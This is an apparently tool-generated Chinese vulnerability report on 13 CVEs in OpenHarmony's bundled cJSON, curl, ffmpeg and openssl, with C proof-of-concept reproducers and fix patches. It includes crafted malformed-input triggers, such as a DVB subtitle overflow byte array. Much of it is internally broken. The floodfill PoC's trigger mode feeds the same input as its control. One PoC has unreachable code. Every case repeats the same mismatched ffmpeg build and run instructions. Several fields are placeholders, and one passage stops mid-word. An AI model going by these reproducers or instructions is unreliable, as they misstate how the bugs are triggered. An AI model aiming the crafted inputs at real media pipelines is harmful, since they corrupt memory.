# OpenHarmony 漏洞分析报告

生成日期：2026-09-29
工具版本：WildTrace (master)
分析范围：13 个案例（公开 CVE 缺口回验 + 新发现候选）

## 案例总览

| # | 案例 | CVE | CWE | 组件 | 发现方式 | PoC |
|---|---|---|---|---|---|---|
| 1 | cjson_merge_alias | CVE-2026-87933 | CWE-416 | third_party/cJSON | 缺口回验 | ✅ |
| 2 | curl_native_ca_reuse | CVE-2026-80231 | CWE-488 | third_party/curl | 缺口回验 | 源级 |
| 3 | curl_psl_supercookie | CVE-2026-82209 | CWE-201 | third_party/curl | 缺口回验 | ✅ |
| 4 | ffmpeg_dvbsub_parser_capacity_overflow | CVE-2026-70628 | CWE-190 (leading to CWE-787) | third_party/ffmpeg | 缺口回验 | ✅ |
| 5 | ffmpeg_floodfill_point_stack_oob | CVE-2026-65705 | CWE-787 | third_party/ffmpeg | 缺口回验 | ✅ |
| 6 | ffmpeg_hqdn3d_dynamic_size_oob | CVE-2026-66036 | CWE-122 | third_party/ffmpeg | 缺口回验 | ✅ |
| 7 | ffmpeg_lcldec_zlib_tail_disclosure | CVE-2026-66038 | CWE-908 | third_party/ffmpeg | 缺口回验 | ✅ |
| 8 | ffmpeg_nvdec_sep_ref_doublefree | CVE-2026-64832 | CWE-415 | third_party/ffmpeg | 缺口回验 | 源级 |
| 9 | ffmpeg_quirc_resize_oob | CVE-2026-66041 | CWE-787 | third_party/ffmpeg | 缺口回验 | ✅ |
| 10 | ffmpeg_swaprect_temp_row_oob | CVE-2026-65706 | CWE-787 | third_party/ffmpeg | 缺口回验 | ✅ |
| 11 | ffmpeg_ty_ac3_trim_underflow | CVE-2026-65704 | CWE-191 (underflow leading to CWE-787) | third_party/ffmpeg | 缺口回验 | ✅ |
| 12 | ffmpeg_wmaenc_extradata_padding | CVE-2026-52296 | CWE-125 | third_party/ffmpeg | 缺口回验 | ✅ |
| 13 | openssl_ocb_oneshot_iv_discard | CVE-2026-45445 | CWE-325 | third_party/openssl | 缺口回验 | ✅ |

## cjson-merge-nonobject-alias

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/cJSON |
| 源码文件 | — |
| 关键行号 | — |
| CVE 编号 | CVE-2026-87933 |
| CWE 分类 | CWE-416 |

> 源码片段见 `—`（关键行号 —）

### 2. 漏洞详细描述

见 case.json

**触发条件**：见 PoC 注释

**影响路径**：见漏洞描述

### 3. PoC 源代码

```c
/* Local regression reproducer for the public cJSON MergePatch alias issue.
 * Fixed, tiny inputs only. No network, external input, or exploit payload.
 * In alias modes the library consumes target AND its borrowed patch subtree.
 * The caller deliberately never deletes either stale pointer after merging.
 */
#include <stdio.h>
#include <string.h>
#include "cJSON.h"
#include "cJSON_Utils.h"

int main(int argc, char **argv)
{
    cJSON *target = NULL, *patch = NULL, *result = NULL, *expected = NULL;
    const char *want = NULL;
    int owns_patch = 0, sensitive = 0, ok;
    if (argc < 2 || argc > 3) return 64;
    if (argc == 3) {
        if (strcmp(argv[2], "sensitive")) return 64;
        sensitive = 1;
    }
    if (!strcmp(argv[1], "subtree")) {
        target = cJSON_Parse("{\"payload\":[1,2,3],\"keep\":true}");
        if (!target) return 70;
        patch = cJSON_GetObjectItemCaseSensitive(target, "payload");
        want = "[1,2,3]";
    } else if (!strcmp(argv[1], "scalar-subtree")) {
        target = cJSON_Parse("{\"payload\":7}");
        if (!target) return 70;
        patch = cJSON_GetObjectItemCaseSensitive(target, "payload");
        want = "7";
    } else if (!strcmp(argv[1], "self-array")) {
        target = cJSON_Parse("[1,2,3]");
        patch = target;
        want = "[1,2,3]";
    } else if (!strcmp(argv[1], "independent")) {
        target = cJSON_Parse("{\"a\":1}");
        patch = cJSON_Parse("[{\"b\":2}]");
        owns_patch = 1;
        want = "[{\"b\":2}]";
    } else if (!strcmp(argv[1], "detached")) {
        target = cJSON_Parse("{\"payload\":[1,2,3]}");
        if (!target) return 70;
        patch = cJSON_DetachItemFromObjectCaseSensitive(target, "payload");
        owns_patch = 1;
        want = "[1,2,3]";
    } else if (!strcmp(argv[1], "object-merge")) {
        target = cJSON_Parse("{\"a\":1,\"keep\":[1,2]}");
        patch = cJSON_Parse("{\"a\":2,\"add\":3}");
        owns_patch = 1;
        want = "{\"a\":2,\"keep\":[1,2],\"add\":3}";
    } else if (!strcmp(argv[1], "object-delete")) {
        target = cJSON_Parse("{\"a\":1,\"keep\":2}");
        patch = cJSON_Parse("{\"a\":null}");
        owns_patch = 1;
        want = "{\"keep\":2}";
    } else return 64;
    if (!target || !patch) {
        if (owns_patch) cJSON_Delete(patch);
        cJSON_Delete(target);
        return 70;
    }
    result = sensitive ? cJSONUtils_MergePatchCaseSensitive(target, patch)
                       : cJSONUtils_MergePatch(target, patch);
    /* MergePatch may destroy target. Never use/delete target again. */
    target = NULL;
    if (!owns_patch) patch = NULL;
    expected = cJSON_Parse(want);
    ok = result && expected && cJSON_Compare(result, expected, 1);
    cJSON_Delete(result);
    cJSON_Delete(expected);
    if (owns_patch) cJSON_Delete(patch);
    if (!ok) return 71;
    printf("CASE_OK %s %s\n", argv[1], sensitive ? "sensitive" : "normal");
    return 0;
}

```

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/cJSON

**影响的功能模块**：cJSON

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

回移上游修复（见 patch.diff）

**修复补丁**：
```diff
--- a/cJSON_Utils.c
+++ b/cJSON_Utils.c
@@ -1325,8 +1325,9 @@
     if (!cJSON_IsObject(patch))
     {
         /* scalar value, array or NULL, just duplicate */
+        cJSON *duplicate = cJSON_Duplicate(patch, 1);
         cJSON_Delete(target);
-        return cJSON_Duplicate(patch, 1);
+        return duplicate;
     }
 
     if (!cJSON_IsObject(target))

```

---

## curl-native-ca-reuse-mismatch

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/curl |
| 源码文件 | — |
| 关键行号 | — |
| CVE 编号 | CVE-2026-80231 |
| CWE 分类 | CWE-488 |

> 源码片段见 `—`（关键行号 —）

### 2. 漏洞详细描述

见 case.json

**触发条件**：见 PoC 注释

**影响路径**：见漏洞描述

### 3. PoC 源代码

> ⚠️ 本案 PoC 为源码级对照验证，无可执行触发器（原因见下）

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/curl

**影响的功能模块**：curl

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

见漏洞描述



---

## curl-psl-supercookie-tailmatch

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/curl |
| 源码文件 | — |
| 关键行号 | — |
| CVE 编号 | CVE-2026-82209 |
| CWE 分类 | CWE-201 |

> 源码片段见 `—`（关键行号 —）

### 2. 漏洞详细描述

见 case.json

**触发条件**：见 PoC 注释

**影响路径**：见漏洞描述

### 3. PoC 源代码

```c
/*
 * PoC: CVE-2026-82209 / curl-psl-supercookie-tailmatch
 *
 * Standalone libcurl PoC (public API only, loopback network only).
 * An in-process HTTP server answers on 127.0.0.1 and the client requests
 * http://localhost:PORT/ (pinned to 127.0.0.1 via CURLOPT_RESOLVE).
 * libpsl lists "localhost" as a public suffix.
 *
 * Modes (argv[1]):
 *   psl-supercookie  server sets "Set-Cookie: flavor=bad; Domain=localhost"
 *                    VULNERABLE  -> cookie stored with tailmatch (domain
 *                                   field reported with a leading dot)
 *                    FIXED       -> tailmatch cleared (no leading dot)
 *   non-psl-control  Domain=poc.localhost (not a suffix): tailmatch retained
 *                    on BOTH original and patched builds (no regression).
 *
 * Exit codes: 0 = expectation met, 1 = expectation violated, 2 = transport
 * error (never treated as a verdict). Expectation is printed as
 * "CASE_OK <mode> tailmatch=<0|1>" for machine classification.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <curl/curl.h>

static int make_listener(uint16_t *port_out) {
  int fd = socket(AF_INET, SOCK_STREAM, 0);
  if(fd < 0) return -1;
  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;
  if(bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) { close(fd); return -1; }
  socklen_t len = sizeof(addr);
  if(getsockname(fd, (struct sockaddr *)&addr, &len) < 0) { close(fd); return -1; }
  if(listen(fd, 1) < 0) { close(fd); return -1; }
  *port_out = ntohs(addr.sin_port);
  return fd;
}

struct server_cfg { int fd; const char *set_cookie; int served; };

static void *serve_once(void *arg) {
  struct server_cfg *cfg = (struct server_cfg *)arg;
  int c = accept(cfg->fd, NULL, NULL);
  if(c < 0) return NULL;
  char buf[4096];
  ssize_t n = recv(c, buf, sizeof(buf) - 1, 0);
  (void)n;
  char response[1024];
  int len = snprintf(response, sizeof(response),
      "HTTP/1.1 200 OK\r\n"
      "Content-Type: text/plain\r\n"
      "Set-Cookie: %s\r\n"
      "Content-Length: 2\r\n"
      "Connection: close\r\n"
      "\r\nhi", cfg->set_cookie);
  if(len > 0) (void)send(c, response, (size_t)len, 0);
  /* drain any second request (redirect/follow-ups none expected) */
  shutdown(c, SHUT_WR);
  close(c);
  cfg->served = 1;
  return NULL;
}

static size_t drop(void *ptr, size_t sz, size_t nm, void *ud) {
  (void)ptr; (void)ud; return sz * nm;
}

/* Returns 1 if any cookie's domain starts with '.', else 0; -1 on error. */
static int any_tailmatch_dot(struct curl_slist *cookies, const char *needle) {
  for(struct curl_slist *it = cookies; it; it = it->next) {
    /* Netscape line: domain \t flag \t path \t secure \t expiry \t name \t value */
    if(strncmp(it->data, needle, strlen(needle)) == 0 && it->data[0] == '.')
      return 1;
    if(it->data[0] == '.' && strstr(it->data, needle))
      return 1;
  }
  return 0;
}

int main(int argc, char **argv) {
  if(argc < 2) { fprintf(stderr, "usage: %s <psl-supercookie|non-psl-control>\n", argv[0]); return 2; }
  const char *mode = argv[1];
  const char *set_cookie;
  int expect_tailmatch;   /* what the ORIGINAL (vulnerable) build produces */
  if(strcmp(mode, "psl-supercookie") == 0) {
    set_cookie = "flavor=bad; Domain=localhost; Path=/";
    expect_tailmatch = 1;   /* vulnerable keeps tailmatch; fix clears it */
  } else if(strcmp(mode, "non-psl-control") == 0) {
    set_cookie = "flavor=good; Domain=poc.localhost; Path=/";
    expect_tailmatch = 1;   /* retained on both builds */
  } else { fprintf(stderr, "unknown mode\n"); return 2; }
  const int control_host = (strcmp(mode, "non-psl-control") == 0);
  const char *host = control_host ? "poc.localhost" : "localhost";

  uint16_t port = 0;
  int fd = make_listener(&port);
  if(fd < 0) { perror("listener"); return 2; }
  struct server_cfg cfg = { fd, set_cookie, 0 };
  pthread_t th;
  if(pthread_create(&th, NULL, serve_once, &cfg) != 0) { close(fd); return 2; }

  char url[128], resolve[64];
  snprintf(url, sizeof(url), "http://%s:%u/", host, (unsigned)port);
  snprintf(resolve, sizeof(resolve), "%s:%u:127.0.0.1", host, (unsigned)port);

  CURL *curl = curl_easy_init();
  if(!curl) { close(fd); return 2; }
  struct curl_slist *res = curl_slist_append(NULL, resolve);
  curl_easy_setopt(curl, CURLOPT_URL, url);
  curl_easy_setopt(curl, CURLOPT_RESOLVE, res);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, drop);
  curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "");  /* enable cookie engine */
  CURLcode rc = curl_easy_perform(curl);

  int verdict = -1;
  if(rc == CURLE_OK) {
    struct curl_slist *cookies = NULL;
    if(curl_easy_getinfo(curl, CURLINFO_COOKIELIST, &cookies) == CURLE_OK && cookies) {
      const char *needle = (strcmp(mode, "psl-supercookie") == 0) ? "localhost" : "poc.localhost";
      verdict = any_tailmatch_dot(cookies, needle);
      curl_slist_free_all(cookies);
    } else {
      verdict = -1;
    }
  }
  curl_slist_free_all(res);
  curl_easy_cleanup(curl);
  pthread_join(th, NULL);
  close(fd);

  if(verdict < 0) { fprintf(stderr, "no cookie observation\n"); return 2; }
  printf("CASE_OK %s tailmatch=%d\n", mode, verdict);
  /* Both modes: the ORIGINAL build must show tailmatch=1.
     The PATCHED build differs only in psl-supercookie (tailmatch=0). */
  return (verdict == expect_tailmatch) ? 0 : 1;
}

```

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/curl

**影响的功能模块**：curl

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

回移上游修复（见 patch.diff）

**修复补丁**：
```diff
# Narrow fix for CVE-2026-82209 adapted to OpenHarmony third_party/curl
# (upstream 95c1e891 assumes the is_public_suffix() wrapper introduced by a
# later refactor; OH's 20260819-snapshot cookie.c checks PSL inline).
# Core semantics preserved verbatim: an accepted cookie whose domain is
# itself a public suffix must not stay tailmatching.
#
# Apply against lib/cookie.c @ f044ac3 (sha256 0327ce5c...).
--- a/lib/cookie.c
+++ b/lib/cookie.c
@@ -1049,6 +1049,13 @@
         Curl_strntolower(lcookie, co->domain, clen);
         lcookie[clen] = 0;
         acceptable = psl_is_cookie_domain_acceptable(psl, lcase, lcookie);
+
+        /* CVE-2026-82209: if the cookie is acceptable, but is set for a PSL
+           domain, then it cannot be tailmatching */
+        if(acceptable && co->tailmatch &&
+           curl_strequal(co->domain, domain) &&
+           psl_is_public_suffix(psl, lcookie))
+          co->tailmatch = FALSE;
+
         Curl_psl_release(data);
       }
       else

```

---

## ffmpeg-dvbsub-parser-capacity-overflow

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/ffmpeg |
| 源码文件 | libavcodec/dvbsub_parser.c |
| 关键行号 | [106] |
| CVE 编号 | CVE-2026-70628 |
| CWE 分类 | CWE-190 (leading to CWE-787) |

> 源码片段见 `libavcodec/dvbsub_parser.c`（关键行号 [106]）

### 2. 漏洞详细描述

见 case.json

**触发条件**：本报告为源码级验证（L4 三侧对照；运行级观测需构造使守卫表达式
溢出的 WTV/传输流输入，报告人未构造端到端样本，如实申报）：
  a) 上游对照：FFmpeg 93f2a525 改写守卫（diff 见附件）；
  b) OH 检出检查：dvbsub_parser.c 106 行仍为修复前三数相加形态
     （实测见附件对照.txt）；
  c) 等价性：OH dvbsub_parser.c 与上游 n7.1.1 逐字节一致；官方
     受影响清单含 7.1.1——结构性证据成立；上游修复 diff 对
     OH 检出 git apply --check 直接通过。
  如需运行级观测：以可控尺寸的 DVB 字幕流送入解析器并观测
  packet_buf 越界写（ASan stack-buffer-overflow）。

**影响路径**：前提条件：产品经 ffmpeg 解析含 DVB 字幕轨道的媒体输入（WTV
文件或 MPEG-TS 流，媒体解析管线处理外部文件/流场景）。攻击者
构造使守卫表达式有符号溢出的输入，绕过容量检查后触发栈缓冲
越界写——内存破坏类缺陷，潜在影响为崩溃至代码执行。

四、PoC & Exploit：

无运行级 PoC（原因如上）；证据为三侧源码对照（上游已修 diff /
OH 检出修复前形态逐行对应 / 官方受影响清单含基线版本），附件
patch.diff 为可直接应用的修复（git apply --check 通过）。

五、修复及缓解措施建议：

回移上游修复 93f2a525：dvbsub_parse() 容量守卫改为
"buf_size - buf_pos > PARSE_BUF_SIZE - pc->packet_index"（附件
patch.diff 即上游原文，对 OH 检出直接适用）。单行等价改写，
无行为回归风险。

### 3. PoC 源代码

```c
/*
 * CVE-2026-70628 运行验证 PoC — dvbsub_parser 三数相加容量守卫有符号溢出
 *
 * 缺陷：dvbsub_parser.c:106 三数相加 (w*h + stride + sizeof) 可能溢出 int32 → 分配不足 → 堆越界写
 * 上游修复：FFmpeg 93f2a525 (2026-07-22) 改为逐项安全检查
 * 等价性：OH third_party_ffmpeg (0a0c4dd33c, 基线 n7.1.1) 与上游逐字节一致。
 *
 * 用法：./poc_dvbsub trigger|control
 *   trigger: 构造 DVB 字幕分段：声明超大宽×高 + 正常 stride → 溢出后小分配 → 写越界
 *   control: 正常尺寸 DVB 字幕分段
 * 判读：ASan 原版 trigger ASan heap-buffer-overflow；补丁版 trigger 安全拒绝（EINVAL）；
 *       control 两版均正常（无回归）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavcodec/avcodec.h>
#include <libavutil/frame.h>
#include <libavutil/mem.h>



static int run_dvbsub(const uint8_t *data, int size)
{
    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_DVB_SUBTITLE);
    if (!codec) { fprintf(stderr, "decoder not found\n"); return 1; }
    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) return 2;
    if (avcodec_open2(ctx, codec, NULL) < 0) return 3;

    AVPacket *pkt = av_packet_alloc();
    pkt->data = (uint8_t *)data;
    pkt->size = size;
    int ret = avcodec_send_packet(ctx, pkt);
    if (ret < 0 && ret != AVERROR(EAGAIN)) {
        fprintf(stderr, "send_packet: %s\n", av_err2str(ret));
    }
    AVFrame *frame = av_frame_alloc();
    while (avcodec_receive_frame(ctx, frame) >= 0) {
        fprintf(stdout, "decoded frame: %dx%d fmt=%d\n",
                frame->width, frame->height, frame->format);
        av_frame_unref(frame);
    }
    av_frame_free(&frame);
    av_packet_free(&pkt);
    avcodec_free_context(&ctx);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "Usage: %s trigger|control\n", argv[0]); return 1; }
    int is_trigger = strcmp(argv[1], "trigger") == 0;

        /* DVB subtitle PES: segment header + display definition + region */
    uint8_t trigger_data[] = {
        0x0F, 0x14, /* display definition segment */
        0x40,       /* clock flag + aspect flag */
        0x7F, 0xFF, /* width=32767 */
        0x7F, 0xFF, /* height=32767 */
        0x0F, 0x11, /* region segment */
        0x00,       /* region id */
        0xFF,       /* version */
        0x7F, 0xFF, /* width */
        0x7F, 0xFF, /* height */
        0x00, 0x0F, /* region depth */
        /* CLUT + object data follows to force allocation and write */
        0x0F, 0x13, 0x00, 0x00, 0x00, /* CLUT segment */
        0x0F, 0x15, 0x00, 0x00,       /* object segment */
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* pixel data overflow payload */
    };
    uint8_t control_data[] = {
        0x0F, 0x14, 0x40, 0x01, 0xE0, 0x00, 0x78, /* 720x576 */
        0xFF,
    };
    const uint8_t *data = is_trigger ? trigger_data : control_data;
    int size = is_trigger ? sizeof(trigger_data) : sizeof(control_data);
    return run_dvbsub(data, size);

    fflush(stdout);
    fprintf(stderr, "=== %s: completed ===\n", is_trigger ? "trigger" : "control");
    return 0;
}

```

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/ffmpeg

**影响的功能模块**：ffmpeg

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

回移上游修复 93f2a525：dvbsub_parse() 容量守卫改为
"buf_size - buf_pos > PARSE_BUF_SIZE - pc->packet_index"（附件
patch.diff 即上游原文，对 OH 检出直接适用）。单行等价改写，
无行为回归风险。



---

## ffmpeg-floodfill-point-stack-oob

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/ffmpeg |
| 源码文件 | libavfilter/vf_floodfill.c |
| 关键行号 | [274] |
| CVE 编号 | CVE-2026-65705 |
| CWE 分类 | CWE-787 |

> 源码片段见 `libavfilter/vf_floodfill.c`（关键行号 [274]）

### 2. 漏洞详细描述

见 case.json

**触发条件**：本报告为源码级验证（同族运行级证据见 CVE-2026-66036/66041 两案）：
  a) 上游对照：24c322fd 为该缺陷修复（diff 见附件，上游标注
     复现样本 8aj_floodfill_dynamic_size.pgm）；
  b) OH 检出检查：vf_floodfill.c 的点栈分配仍在 config_input
     （修复前形态在位）；filter_frame 使用帧尺寸（逐行比对见
     附件对照.txt）；
  c) 等价性：OH 文件与上游 n7.1.1 逐字节一致；官方受影响清单
     含 7.1.1——结构性证据成立；上游修复 diff 对 OH 检出
     git apply --check 直接通过。
  运行验证尝试（如实记录）：构建了 GRAY8 直连 graph 的 PoC，
  尝试 512²/8192²/12288² 与 1x1→64² 等参数组合均未触发 ASan——
  7.1.1 分配含 4 倍余量，全同色图的 LIFO 泛洪栈深实测低于理论
  最坏，超大帧又受内存分配限制；按上游样本名（dyna

**影响路径**：前提条件：产品/应用使用 ffmpeg 滤镜图包含 floodfill（区域填充
场景）且处理尺寸动态变化的输入流。攻击者构造分辨率远大于初始
配置的帧序列驱动点栈越界；是否需要用户交互取决于应用是否自动
处理不可信输入。越界写内容为坐标数据，可致堆内存破坏。

四、PoC & Exploit：

见附件 poc_floodfill.c 与对照.txt 的运行尝试记录（未触发的参数
组合与原因分析如实呈现）；证据主体为三侧源码对照与同族运行级
类比，附件 patch.diff 为可直接应用的修复。

五、修复及缓解措施建议：

回移上游修复 24c322fd：点栈分配移至 filter_frame 按当前帧尺寸
动态进行（points_size 跟踪 + av_fast_malloc + av_size_mult 溢出
检查），config_input 不再预分配（附件 patch.diff 即上游原文，
对 OH 检出直接适用）。临时缓解：避免在包含 floodfill 的滤镜图
中处理分辨率动态增大的不可信输入。

### 3. PoC 源代码

```c
/*
 * CVE-2026-65705 运行验证 PoC — third_party/ffmpeg vf_floodfill 点栈堆越界写
 *
 * 缺陷：config_input 按 link 初始尺寸 av_calloc(inlink->w * inlink->h, 4)
 * 分配点栈 s->points；filter_frame 以帧自身尺寸 (frame->width/height) 驱动
 * 泛洪填充——帧尺寸增大时点栈按新帧规模压栈，越界写。
 * 上游修复：FFmpeg 24c322fd（2026-07-13，"size the point stack for the
 * current frame"，Fixes: out of array access，样本 8aj_floodfill_
 * dynamic_size.pgm）。OH（=n7.1.1 逐字节）为修复前形态。
 *
 * 用法：./poc_floodfill trigger|control
 *   trigger: 64x64 帧排空后直推 512x512 帧（变尺寸帧透传）
 *   control: 两帧均 64x64
 * 判读：ASan 原版 trigger 报 heap-buffer-overflow（点栈越界写，退出码 1）；
 *       补丁版 trigger 正常（点栈按 512x512 动态重分配，退出码 0）；
 *       control 两版均正常（无回归）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavfilter/avfilter.h>
#include <libavfilter/buffersink.h>
#include <libavfilter/buffersrc.h>
#include <libavutil/frame.h>
#include <libavutil/pixfmt.h>

static int push_frame(AVFilterContext *src, int w, int h, int fill)
{
    AVFrame *f = av_frame_alloc();
    if (!f) return -1;
    f->format = AV_PIX_FMT_GRAY8;
    f->width = w;
    f->height = h;
    if (av_frame_get_buffer(f, 32) < 0) { av_frame_free(&f); return -1; }
    memset(f->data[0], fill, (size_t)h * f->linesize[0]);
    int ret = av_buffersrc_add_frame(src, f);
    av_frame_free(&f);
    return ret;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "usage: %s trigger|control\n", argv[0]); return 2; }
    int trigger = !strcmp(argv[1], "trigger");
    if (!trigger && strcmp(argv[1], "control")) { fprintf(stderr, "bad mode\n"); return 2; }

    char graph[] =
        "buffer=video_size=1x1:pix_fmt=gray8:time_base=1/25,"
        "floodfill=x=0:y=0,buffersink";

    AVFilterGraph *g = avfilter_graph_alloc();
    AVFilterInOut *in = NULL, *out = NULL;
    if (avfilter_graph_parse_ptr(g, graph, &in, &out, NULL) < 0 ||
        avfilter_graph_config(g, NULL) < 0) {
        fprintf(stderr, "FAIL: graph\n"); return 2;
    }
    AVFilterContext *src = NULL, *sinkc = NULL;
    for (unsigned i = 0; i < g->nb_filters && !(src && sinkc); i++) {
        const char *n = g->filters[i]->filter->name;
        if (!src && !strcmp(n, "buffer")) src = g->filters[i];
        else if (!sinkc && !strcmp(n, "buffersink")) sinkc = g->filters[i];
    }

    int r1 = push_frame(src, 1, 1, 0xC0);
    AVFrame *drain = av_frame_alloc();
    while (av_buffersink_get_frame(sinkc, drain) >= 0) av_frame_unref(drain);
    av_frame_free(&drain);

    int r2 = trigger ? push_frame(src, 64, 64, 0xC0)
                     : push_frame(src, 64, 64, 0xC0);

    AVFrame *sink = av_frame_alloc();
    int pulled = 0, ret;
    while ((ret = av_buffersink_get_frame(sinkc, sink)) >= 0) { pulled++; av_frame_unref(sink); }
    av_frame_free(&sink);

    printf("CASE_DONE mode=%s push1=%d push2=%d pulled=%d\n",
           trigger ? "trigger" : "control", r1, r2, pulled);
    avfilter_inout_free(&in); avfilter_inout_free(&out);
    avfilter_graph_free(&g);
    return 0;
}

```

**PoC 使用方法**：
```
# 在 OH ffmpeg/curl/openssl 构建产物上编译执行
cc -o poc poc.c $(pkg-config --cflags --libs libavcodec libavutil) -fsanitize=address
./poc trigger    # 触发漏洞
./poc control    # 正常对照组
```

### 4. 影响分析

**影响的代码模块**：third_party/ffmpeg

**影响的功能模块**：ffmpeg

**影响的 OpenHarmony 版本分支**：

- v4.1: 🔴 affected
- v5.0: 🔴 affected
- v5.1: 🔴 affected
- v6.0: 🔴 affected
- v7.0: 🔴 affected
- master: 🔴 affected

### 5. 修复建议

回移上游修复 24c322fd：点栈分配移至 filter_frame 按当前帧尺寸
动态进行（points_size 跟踪 + av_fast_malloc + av_size_mult 溢出
检查），config_input 不再预分配（附件 patch.diff 即上游原文，
对 OH 检出直接适用）。临时缓解：避免在包含 floodfill 的滤镜图
中处理分辨率动态增大的不可信输入。



---

## ffmpeg-hqdn3d-dynamic-size-oob

### 1. 源码位置与内容

| 项目 | 值 |
|---|---|
| 组件 | third_party/ffmpeg |
| 源码文件 | libavfilter/vf_hqdn3d.c |
| 关键行号 | [98] |
| CVE 编号 | CVE-2026-66036 |
| CWE 分类 | CWE-122 |

> 源码片段见 `libavfilter/vf_hqdn3d.c`（关键行号 [98]）

### 2. 漏洞详细描述

见 case.json

**触发条件**：见 PoC 注释

**影响路径**：前提条件：产品/应用使用 ffmpeg 滤镜图且包含 hqdn3d 去噪滤镜
（常用视频处理链），输入为不可信媒体（转码/滤镜服务场景典型）。
攻击者构造分辨率中途增大的视频流驱动越界写；应用自动处理不可信
输入时无需用户交互。越界写发生在去噪管线内、写入内容与媒体数据
相关（可控度取决于输入构造），上游评定可致堆内存破坏。断言开启
的构建下变尺寸帧触发 abort（拒绝服务）；断言关闭的构建进入越界写。

四、PoC & Exploit：

见附件 poc_hqdn3d.c 与运行验证记录.md（2×2 矩阵：原版 trigger
ASan 堆越界写 / 补丁版拒绝变尺寸帧 / control 两侧正常；环境 WSL2
Ubuntu 24.04、clang 18.1.3、ASan+UBSan、无网络无文件 I/O）。本报告
未构造代码执行利用，越界写原语与上游公告一致。

五、修复及缓解措施建议：

推荐回移上游 5d7112c（filter_frame 检测帧尺寸变化后重跑
config_input 重新分配行缓冲、输出按帧尺寸分配，并将 hqdn3d 加入
avfilter.c 

### 3. PoC 源代码

```c
/*
 * CVE-2026-66036 运行验证 PoC — third_party/ffmpeg vf_hqdn3d 堆越界写
 *
 * 等价性：OH third_party_ffmpeg(0a0c4dd33c) 的 libavfilter/vf_hqdn3d.c
 * 为 n7.1.1 版本结构（无 s->format/width/height 跟踪、无变尺寸防御；
 * 上游 master 在 7.1.1 后曾加入 EINVAL 防御、2026-07-22 5d7112c 改为
 * 动态尺寸支持）。本 PoC 在上游 n7.1.1 构建上执行（assert-level=0，
 * 即 oss-fuzz 同款断言关闭条件），结论直接代表 OH 组件。
 *
 * 触发原理：config_input 按 link 初始宽度 av_malloc_array(inlink->w)
 * 分配去噪行缓冲 s->line[]；do_denoise 以帧自身尺寸
 * (AV_CEIL_RSHIFT(in->width/h,...)) 跑 denoise()——帧尺寸增大时
 * 行缓冲按新宽度写入，堆越界写。ff_filter_frame 对非白名单滤镜的
 * av_assert1 尺寸断言在 assert-level=0 下不拦截（上游修复 5d7112c
 * 将 hqdn3d 加入白名单并支持动态尺寸，正为此场景）。
 *
 * 用法：./poc_hqdn3d trigger|control
 *   trigger: 先 64x64 后 512x512 两帧 YUV420P
 *   control: 两帧均 64x64
 * 判读：ASan 下原版构建 trigger 报 heap-buffer-overflow（漏洞观测）；
 *       补丁版（窄化 EINVAL 防御）trigger 报错返回不越界；control
 *       两侧均正常（无回归）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavfilter/avfilter.h>
#include <libavfilter/buffersink.h>
#include <libavfilter/buffersrc.h>
#include <libavutil/frame.h>
#include <libavutil/opt.h>
#include <libavutil/pixfmt.h>

static int push_frame(AVFilterContext *src, int w, int h, int fill)
{
    AVFrame *f = av_frame_alloc();
    if (!f) return -1;
    f->format = AV_PIX_FMT_YUV420P;
    f->width = w;
